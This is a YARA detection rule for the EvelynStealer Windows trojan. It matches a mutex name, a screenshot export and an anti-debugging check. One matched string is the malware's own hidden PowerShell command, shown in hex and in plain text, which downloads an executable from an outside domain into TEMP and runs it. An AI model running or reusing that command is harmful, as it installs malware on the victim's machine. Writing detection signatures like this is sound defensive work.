
rule Trojan_Win32_EvelynStealer_AB_MTB{
	meta:
		description = "Trojan:Win32/EvelynStealer.AB!MTB,SIGNATURE_TYPE_PEHSTR,08 00 08 00 04 00 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 27 68 74 74 70 3a 2f 2f 64 61 72 6b 67 70 74 70 72 69 76 61 74 65 2e 63 6f 6d 2f 69 6b 6e 6f 77 79 6f 75 2e 6d 6f 64 65 6c 27 20 2d 4f 75 74 46 69 6c 65 20 24 65 6e 76 3a 54 45 4d 50 5c 72 75 6e 74 69 6d 65 2e 65 78 65 3b 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 24 65 6e 76 3a 54 45 4d 50 5c 72 75 6e 74 69 6d 65 2e 65 78 65 } //2 powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://darkgptprivate.com/iknowyou.model' -OutFile $env:TEMP\runtime.exe; Start-Process $env:TEMP\runtime.exe
		$a_01_1 = {43 00 4f 00 4f 00 4c 00 5f 00 53 00 43 00 52 00 45 00 45 00 4e 00 53 00 48 00 4f 00 54 00 5f 00 4d 00 55 00 54 00 45 00 58 00 5f 00 59 00 41 00 52 00 52 00 52 00 } //2 COOL_SCREENSHOT_MUTEX_YARRR
		$a_01_2 = {5f 4d 61 6b 65 53 63 72 65 65 6e 73 68 6f 74 42 79 43 6f 6d 6d 61 6e 64 40 34 } //2 _MakeScreenshotByCommand@4
		$a_01_3 = {49 73 44 65 62 75 67 67 65 72 50 72 65 73 65 6e 74 } //2 IsDebuggerPresent
	condition:
		((#a_01_0  & 1)*2+(#a_01_1  & 1)*2+(#a_01_2  & 1)*2+(#a_01_3  & 1)*2) >=8
 
}